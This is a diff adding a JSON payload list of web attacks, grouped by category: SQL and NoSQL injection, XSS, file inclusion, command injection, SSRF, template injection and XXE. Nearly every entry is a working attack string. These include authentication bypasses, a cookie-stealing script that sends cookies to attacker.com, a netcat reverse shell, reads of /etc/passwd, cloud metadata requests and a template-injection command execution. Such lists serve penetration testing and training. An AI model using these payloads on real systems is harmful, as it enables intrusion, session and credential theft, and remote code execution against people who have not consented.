@@ -1,0 +1,90 @@
+[
+  {
+    "category": "SQL Injection",
+    "description": "Exploit vulnerabilities in database queries to extract data, bypass login, or execute commands.",
+    "payloads": [
+      { "name": "Basic Auth Bypass", "code": "' OR 1=1 --" },
+      { "name": "Auth Bypass (Admin)", "code": "admin' --" },
+      { "name": "Time-based Blind (MySQL)", "code": "SLEEP(5) /*" },
+      { "name": "Time-based Blind (PostgreSQL)", "code": "pg_sleep(5)" },
+      { "name": "Union Based (Extract Version)", "code": "' UNION SELECT @@version, null, null --" },
+      { "name": "Union Based (Extract Tables)", "code": "' UNION SELECT table_name, null FROM information_schema.tables --" }
+    ]
+  },
+  {
+    "category": "Cross-Site Scripting (XSS)",
+    "description": "Inject malicious scripts into trusted websites to steal cookies, hijack sessions, or deface sites.",
+    "payloads": [
+      { "name": "Basic Alert", "code": "<script>alert(1)</script>" },
+      { "name": "Image Error Vector", "code": "<img src=x onerror=alert('XSS')>" },
+      { "name": "SVG Vector", "code": "<svg onload=alert(1)>" },
+      { "name": "Bypass Filter (Mixed Case)", "code": "<sCripT>alert(1)</ScRipt>" },
+      { "name": "JavaScript Protocol", "code": "javascript:alert(1)" },
+      { "name": "Cookie Stealer", "code": "<script>fetch('http://attacker.com/?c='+document.cookie)</script>" }
+    ]
+  },
+  {
+    "category": "Local File Inclusion (LFI)",
+    "description": "Trick the web server into exposing sensitive local files on the operating system.",
+    "payloads": [
+      { "name": "Basic Linux Passwd", "code": "../../../../etc/passwd" },
+      { "name": "Null Byte Bypass", "code": "../../../../etc/passwd%00" },
+      { "name": "Double URL Encode", "code": "%252e%252e%252fetc%252fpasswd" },
+      { "name": "PHP Filter Base64", "code": "php://filter/convert.base64-encode/resource=index.php" },
+      { "name": "Basic Windows INI", "code": "..\\..\\..\\..\\windows\\win.ini" }
+    ]
+  },
+  {
+    "category": "Command Injection",
+    "description": "Execute arbitrary operating system commands via a vulnerable web application.",
+    "payloads": [
+      { "name": "Basic Command (;) Linux", "code": "; id" },
+      { "name": "Logical AND (&&)", "code": "&& whoami" },
+      { "name": "Pipe Operator (|)", "code": "| cat /etc/passwd" },
+      { "name": "Command Substitution", "code": "`whoami`" },
+      { "name": "Bypass Space Filter", "code": "${IFS}whoami" },
+      { "name": "Reverse Shell (Netcat)", "code": "nc -e /bin/sh 10.0.0.1 4444" }
+    ]
+  },
+  {
+    "category": "Server-Side Request Forgery (SSRF)",
+    "description": "Force the server to make HTTP requests to internal or external resources on your behalf.",
+    "payloads": [
+      { "name": "Localhost Basic", "code": "http://localhost/" },
+      { "name": "AWS Metadata V1", "code": "http://169.254.169.254/latest/meta-data/" },
+      { "name": "GCP Metadata", "code": "http://metadata.google.internal/computeMetadata/v1/" },
+      { "name": "Bypass (Decimal IP)", "code": "http://2130706433/" },
+      { "name": "Bypass (IPv6 Localhost)", "code": "http://[::1]/" },
+      { "name": "DNS Rebinding", "code": "http://127.0.0.1.nip.io/" }
+    ]
+  },
+  {
+    "category": "Server-Side Template Injection (SSTI)",
+    "description": "Exploit insecure implementation of template engines to execute arbitrary code.",
+    "payloads": [
+      { "name": "Jinja2/Twig (Python/PHP)", "code": "{{7*7}}" },
+      { "name": "Jinja2 RCE (Read config)", "code": "{{config.items()}}" },
+      { "name": "Jinja2 RCE (OS Command)", "code": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" },
+      { "name": "Java (Spring/Thymeleaf)", "code": "${7*7}" }
+    ]
+  },
+  {
+    "category": "XML External Entity (XXE)",
+    "description": "Exploit vulnerable XML parsers to read local files, execute requests, or cause DoS.",
+    "payloads": [
+      { "name": "Basic Entity Test", "code": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY test \"hello\"> ]><root>&test;</root>" },
+      { "name": "Read Local File (/etc/passwd)", "code": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>" },
+      { "name": "Read PHP Source (Base64)", "code": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"> ]><root>&xxe;</root>" }
+    ]
+  },
+  {
+    "category": "NoSQL Injection",
+    "description": "Bypass authentication or extract data in NoSQL databases like MongoDB.",
+    "payloads": [
+      { "name": "Auth Bypass (Not Equal)", "code": "{\"$ne\": null}" },
+      { "name": "Auth Bypass (Greater Than)", "code": "{\"$gt\": \"\"}" },
+      { "name": "Regex Extract Data", "code": "{\"$regex\": \"^admin\"}" },
+      { "name": "Where Clause Injection", "code": "{\"$where\": \"this.password == 1 || true\"}" }
+    ]
+  }
+]
